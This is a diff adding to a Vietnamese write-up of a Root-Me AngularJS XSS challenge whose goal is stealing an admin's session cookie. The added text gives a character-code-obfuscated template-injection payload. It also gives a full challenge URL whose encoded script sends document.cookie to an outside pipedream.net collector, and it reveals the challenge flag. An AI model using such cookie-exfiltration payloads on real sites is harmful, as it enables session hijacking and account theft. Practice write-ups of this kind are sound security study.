@@ -137,4 +137,25 @@ Steal the admin’s session cookie.
         
  ```
 
-Cái ta cần bypass ở đây là truyền sao cho vượt qua được giá trị var name, ví dụ thành var name = '' ; alert(1) -- . Nhưng có vẻ ' bị mã hóa rồi 
+Cái ta cần bypass ở đây là truyền sao cho vượt qua được giá trị var name, ví dụ thành var name = '' ; alert(1) -- . Nhưng có vẻ ' bị mã hóa rồi.
+Ta dùng script sau: 
+
+```
+{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
+
+```
+>Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
+
+![image](https://user-images.githubusercontent.com/104350480/218153267-ba81ca39-fbe3-4094-94a1-51de61b14277.png)
+
+Sau khi alert được ròi thì ta làm tương tự như trên thôi, ta sẽ gửi đường link kèm theo payload xss và khi thằng admin truy cập vào thì payload sẽ được trigger dưới session của admin:
+
+> Payload: 	
+http://challenge01.root-me.org/web-client/ch35/?name={{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,101,111,55,120,120,97,115,112,54,108,104,102,118,97,106,46,109,46,112,105,112,101,100,114,101,97,109,46,110,101,116,47,63,99,61,34,46,99,111,110,99,97,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))()}}
+
+Được flag trả về:
+
+
+![image](https://user-images.githubusercontent.com/104350480/218155614-d3be95db-d5b1-4df7-bcb3-a6e268a5df48.png)
+
+>Flag: rootme{@NGu1@R_J$_1$_C001}
